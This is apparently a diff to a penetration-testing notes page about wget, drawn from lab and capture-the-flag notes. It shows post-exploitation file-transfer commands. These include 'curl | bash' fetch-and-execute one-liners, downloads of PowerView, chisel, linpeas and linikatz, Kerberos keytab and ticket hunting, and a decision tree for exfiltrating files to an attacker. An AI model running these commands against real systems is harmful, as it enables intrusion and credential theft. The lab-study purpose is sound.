@@ -9,6 +9,116 @@ hideFooterPagination: true
 
 {/* Generated from Commands/wget.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## wget: choose the operation and read the result
+
+Download a file from HTTP or FTP.
+
+### What the result establishes
+
+Check the saved name, response status and whether redirects led to the intended object.
+
+### Prerequisites and common failures
+
+Default naming and overwrite behavior can hide an earlier result; proxy or TLS errors need investigation rather than assuming the file is absent.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+wget http://TARGET_IP:8000/file.zip -O file.zip
+```
+
+### Example 2: JavaScript (Windows — cscript.exe)
+
+Run in: **Saved lab example**.
+
+```cmd
+cscript.exe /nologo wget.js http://<IP>/PowerView.ps1 PowerView.ps1
+```
+
+Saved context: [File Transfers for Linux and Windows — JavaScript (Windows — cscript.exe)](/post-exploitation/file-transfers-cheat-sheet#javascript-windows-—-cscript-exe). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: VBScript (Windows — cscript.exe)
+
+Run in: **Saved lab example**.
+
+```cmd
+cscript.exe /nologo wget.vbs http://<IP>/PowerView.ps1 PowerView.ps1
+```
+
+Saved context: [File Transfers for Linux and Windows — VBScript (Windows — cscript.exe)](/post-exploitation/file-transfers-cheat-sheet#vbscript-windows-—-cscript-exe). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: wget and cURL
+
+Run in: **Saved lab example**.
+
+```bash
+wget http://<IP>:<PORT>/file.sh -O /tmp/file.sh       # -O sets output filename
+curl -o /tmp/file.sh http://<IP>:<PORT>/file.sh        # -o (lowercase) sets output filename
+```
+
+Saved context: [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: wget and cURL
+
+Run in: **Saved lab example**.
+
+```bash
+curl http://<IP>/LinEnum.sh | bash                      # download and execute without saving
+wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = output to stdout
+```
+
+Saved context: [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Quick Decision Tree
+
+Run in: **Saved lab example**.
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Enumeration workflow
+
+Run in: **Saved lab example**.
+
+```bash
+wget -r ftp://anonymous:anonymous@<IP>/        # recursively mirror the whole server
+```
+
+Saved context: [FTP Enumeration and File Access — Enumeration workflow](/enumeration/ftp-enumeration-file-transfer-protocol#enumeration-workflow). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Download a file from HTTP or FTP.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=wget) · [All tools](/index)
@@ -46,6 +156,13 @@ find / -name '*.keytab' 2>/dev/null; ls -la /etc/krb5.keytab 2>/dev/null
 ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 5. Credential hunting (Linux)](/cheatsheets/ad-attack-path-worked-example#5-credential-hunting-linux)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Option A — chisel + proxychains (SOCKS)">
@@ -64,6 +181,13 @@ wget http://<KALI>:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 proxychains nxc smb 172.16.119.11 -u user -p pass
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — Option A — chisel + proxychains (SOCKS)](/cheatsheets/ad-attack-path-worked-example#option-a-—-chisel-+-proxychains-socks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Scrapy — ReconSpider">
@@ -79,6 +203,13 @@ unzip ReconSpider.zip
 python3 ReconSpider.py http://<target>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DNS and Web Reconnaissance: Full Workflow — Scrapy — ReconSpider](/recon/dns-web-recon-cheat-sheet#scrapy-—-reconspider)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Enumeration workflow">
@@ -90,6 +221,13 @@ python3 ReconSpider.py http://<target>
 ```bash
 wget -r ftp://anonymous:anonymous@<IP>/        # recursively mirror the whole server
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [FTP Enumeration and File Access — Example 2: Enumeration workflow](/enumeration/ftp-enumeration-file-transfer-protocol#example-2-enumeration-workflow) · [FTP Enumeration and File Access — Enumeration workflow](/enumeration/ftp-enumeration-file-transfer-protocol#enumeration-workflow)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -127,6 +265,13 @@ UPLOADING FROM LINUX:
 └── Nothing works?      → Start python3 -m http.server on target, wget from attacker
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="wget and cURL">
@@ -140,12 +285,26 @@ wget http://<IP>:<PORT>/file.sh -O /tmp/file.sh       # -O sets output filename
 curl -o /tmp/file.sh http://<IP>:<PORT>/file.sh        # -o (lowercase) sets output filename
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 4: wget and cURL](/enumeration/citrix-netscaler#example-4-wget-and-curl) · [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **File Transfers for Linux and Windows**
 
 ```bash
 curl http://<IP>/LinEnum.sh | bash                      # download and execute without saving
 wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = output to stdout
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 5: wget and cURL](/enumeration/citrix-netscaler#example-5-wget-and-curl) · [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -164,6 +323,13 @@ wget http://10.10.14.174:8080/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTB Nibbles: Walkthrough and Report — Enumeration (post-foothold)](/cheatsheets/nibbles#enumeration-post-foothold)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -186,6 +352,13 @@ nc -lvnp 4444       # netcat listener (catch reverse shells)
 python3 -m http.server 80            # quick web server to transfer files
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kali Terminal, tmux, zsh, and Vim — 6. Networking / pentest quick commands](/cheatsheets/terminal-tmux-zsh-cheatsheet#6-networking-/-pentest-quick-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Tools">
@@ -202,6 +375,13 @@ curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.s
 ./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Tools](/privesc/linux-privesc-checklist#tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Linux Privilege Escalation: Full Checklist**
 
 ```powershell
@@ -210,6 +390,13 @@ curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/ma
 ./lse.sh -l1 # shows interesting information that should help you to privesc
 ./lse.sh -l2 # dump all the information it gathers about the system
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Tools](/privesc/linux-privesc-checklist#tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -224,6 +411,13 @@ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.
 chmod +x linikatz.sh
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Linikatz](/password-attacks/pass-the-ticket-from-linux#linikatz)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Step 5 — Transfer the ticket from LINUX01 to Kali">
@@ -237,6 +431,13 @@ chmod +x linikatz.sh
 proxychains wget http://172.16.1.15:8080/krb5cc_647401106_8Dt6uj
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pass the Ticket from Linux**
 
 Context from the notebook: Port mismatch:  the  python3 -m http.server &lt;port>  and the  wget `http://...:<port>`  must use the  same  port.
@@ -244,6 +445,13 @@ Context from the notebook: Port mismatch:  the  python3 -m http.server &lt;port>
 ```text
 wget http://...:<port>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -259,6 +467,13 @@ curl http://<reachable>:8080/tool -o /tmp/tool
 # recursive (a whole dir): wget -r -np -nH --cut-dirs=1 -R "index.html*" http://<reachable>:8080/Linux/
 scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Linux target](/cheatsheets/pivoting-file-transfer#downloading-to-a-linux-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -296,6 +511,13 @@ scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
 └── Either → reverse shell via exploit
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Mental Model — "What Do I Use When?"](/reference/master-protocol-service-quick-reference#mental-model-—-what-do-i-use-when)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Quick Decision">
@@ -310,6 +532,13 @@ Linux target   → SCP/SFTP (22) or NFS (2049)
 No auth needed → FTP anonymous or TFTP
 Web server     → wget / curl
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Quick Decision](/reference/master-protocol-service-quick-reference#quick-decision)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -328,6 +557,13 @@ chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out
 id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; uname -a
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Privilege Escalation: Choose a Checklist — Quick-start command cheat (run first, always)](/privesc/index#quick-start-command-cheat-run-first-always)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Quick Web Servers (Serve Files from Target)">
@@ -341,6 +577,13 @@ Context from the notebook: Then from your attack box:  wget &lt;TARGET_IP>:8000/
 ```text
 wget <TARGET_IP>:8000/file.txt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Quick Web Servers (Serve Files from Target)](/post-exploitation/file-transfers-cheat-sheet#quick-web-servers-serve-files-from-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -356,6 +599,21 @@ Context from the notebook: wget  to internal IP hangs/refused Kali can't reach i
 proxychains wget
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Troubleshooting quick reference](/password-attacks/pass-the-ticket-from-linux#troubleshooting-quick-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
